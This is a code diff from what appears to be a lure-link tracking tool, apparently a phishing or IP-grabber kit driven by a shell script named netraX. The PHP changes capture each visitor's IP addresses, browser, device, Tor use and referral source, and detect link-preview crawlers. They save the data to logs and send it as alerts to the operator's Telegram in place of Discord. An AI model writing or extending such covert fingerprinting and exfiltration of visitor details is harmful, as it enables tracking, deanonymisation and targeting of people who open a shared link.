- * If critical fields (IP, browser, OS) are all unknown/empty,
- * only prints a "details not found" notice to the terminal.
+ * Capture visitor info, detect link shares / previews, print to terminal,
+ * save to data/, and signal the shell script via flag files.
  *
  * @param  string|null $dataDir  Override data directory (default: __DIR__/data)
  * @return array                 Structured visitor info
@@ -973,6 +1541,47 @@ function processVisitor(?string $dataDir = null): array
         $info['device_type']     = 'Desktop (Tor Anonymized)';
     }
 
+    /* ── Check if this request is a Link Share / Preview Crawler ── */
+    if (!empty($info['is_preview_bot']) && !empty($info['preview_info']['is_preview'])) {
+        $shareInfo = $info['preview_info'];
+        $shareText = formatShareAlert($shareInfo, $info, $templateName);
+
+        /* Print to terminal */
+        printVisitorToTerminal($shareText);
+
+        /* Save to share logs */
+        saveShareLog($shareInfo, $info, $dataDir);
+
+        /* Send Telegram Share Alert (deduplicated per 10s per IP+platform) */
+        $dedupKey  = md5($info['ip'] . '|' . $shareInfo['platform']);
+        $dedupFile = $dataDir . '/.share_dedup_' . $dedupKey;
+        $isDup     = false;
+        if (is_file($dedupFile) && (time() - (int) @filemtime($dedupFile)) < 10) {
+            $isDup = true;
+        }
+
+        if (!$isDup) {
+            @touch($dedupFile);
+            sendTelegramShareAlert(
+                $shareInfo['platform'],
+                [
+                    'Platform' => $shareInfo['platform'] . ' (' . $shareInfo['type'] . ')',
+                    'Activity' => $shareInfo['description'],
+                    'Template' => $templateName,
+                    'Crawler'  => $shareInfo['bot_name'],
+                    'IP'       => $info['ip'],
+                    'Status'   => 'Preview card generated in chat!',
+                    'Time'     => $info['timestamp'],
+                ]
+            );
+
+            /* Signal the shell script with the link share banner */
+            file_put_contents($dataDir . '/.flag_share', $shareText);
+        }
+
+        return $info;
+    }
+
     /* Check if we got meaningful data */
     $hasIP      = ($info['ip'] !== 'unknown' && $info['ip'] !== '');
     $hasBrowser = ($info['browser'] !== 'Unknown');
@@ -994,7 +1603,7 @@ function processVisitor(?string $dataDir = null): array
     /* Terminal output */
     printVisitorToTerminal($logText);
 
-    /* ── Discord Notification: Visitor Arrived ── */
+    /* ── Telegram Notification: Visitor Arrived ── */
     $isTor       = !empty($info['is_tor']);
     $torLabel    = $isTor ? '🟠 YES -- Tor Exit Node' : 'No';
     $ipv4Label   = !empty($info['ipv4']) ? $info['ipv4'] : 'Not detected';
@@ -1004,11 +1613,19 @@ function processVisitor(?string $dataDir = null): array
     if (!empty($info['device_model'])) {
         $deviceLabel .= ' -- ' . $info['device_model'];
     }
+    $sourceLabel = $info['source_platform'];
+    if (!empty($info['source_detail']) && $info['source_detail'] !== 'Direct URL entry or bookmark') {
+        $sourceLabel .= ' (' . $info['source_detail'] . ')';
+    }
+    if (!empty($info['is_in_app'])) {
+        $sourceLabel .= ' [In-App WebView]';
+    }
 
-    sendDiscordAlert(
+    sendTelegramAlert(
         '📡 New Visitor -- ' . $templateName,
         [
             'Template' => $templateName,
+            'Origin'   => $sourceLabel,
             'IPv4'     => $ipv4Label,
             'IPv6'     => $ipv6Label,
             'Browser'  => $brLabel,
@@ -1016,17 +1633,16 @@ function processVisitor(?string $dataDir = null): array
             'Device'   => $deviceLabel,
             'Tor'      => $torLabel,
             'Time'     => $info['timestamp'],
-        ],
-        3447003   /* 0x3498DB  Discord blue */
+        ]
     );
 
-    /* Save JSON line log (includes template field) */
+    /* Save JSON line log (includes template & referral fields) */
     saveVisitorLog($info, $dataDir);
 
     /* Save readable text log */
     saveVisitorLogReadable($logText, $dataDir);
 
-    /* Signal the shell script (netraX-2.0.sh checkfound loop) */
+    /* Signal the shell script (netraX-3.0.sh checkfound loop) */
     $flagContent = $logText;
     file_put_contents($dataDir . '/.flag_visitor', $flagContent);
 
